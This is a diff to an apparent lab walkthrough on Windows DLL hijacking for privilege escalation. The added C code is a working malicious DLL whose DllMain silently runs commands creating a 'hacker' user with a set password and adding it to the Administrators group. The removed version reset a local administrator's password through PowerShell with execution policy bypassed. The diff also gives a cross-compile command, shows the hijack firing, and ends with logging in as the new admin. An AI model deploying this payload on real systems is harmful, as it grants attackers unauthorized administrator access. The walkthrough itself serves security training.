@@ -89,40 +89,28 @@ certain libraries, even though these libraries were never present on the system.
 
 ## Example DLL in C++;
 
-```C++
+```C
 #include <windows.h>
 
-extern "C" __declspec(dllexport) void ListProgramFiles() {
-    // PowerShell command line
-    wchar_t cmd[] = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-LocalUser -Name \"SuperAdministrator\" -Password (\"NewPassword123!\" | ConvertTo-SecureString -AsPlainText -Force)";
-
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = {};
-
-    // Hide console window if triggered from a GUI application
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
-    if (CreateProcessW(
-            NULL,
-            cmd,
-            NULL,
-            NULL,
-            FALSE,
-            CREATE_NO_WINDOW,
-            NULL,
-            NULL,
-            &si,
-            &pi)) {
-        // Wait for PowerShell to finish executing
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-}
-
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        ZeroMemory(&pi, sizeof(pi));
+
+        char cmd[] = "cmd.exe /c net user hacker P@ssw0rd123! /add && net localgroup Administrators hacker /add";
+
+        if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
+                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 5000);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+    }
     return TRUE;
 }
 ```
@@ -130,7 +118,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 > Open your kali, and use a cross compiler to conver the .cpp code to .dll:
 
 ```shell
-x86_64-w64-mingw32-g++ -shared -o SprintCSP.dll main.cpp
+x86_64-w64-mingw32-gcc -shared -o SprintCSP.dll main.c -static-libgcc
 ```
 
 > Now you have the .dll file. Transfer it to Windows:
@@ -181,3 +169,4 @@ PS C:\Users\Student\Downloads> .\WIN10RpcClient.exe
 [+] Dll hijack triggered! 
 ```
 
+> Now login to the new hacker account, and we have the admin privileges!
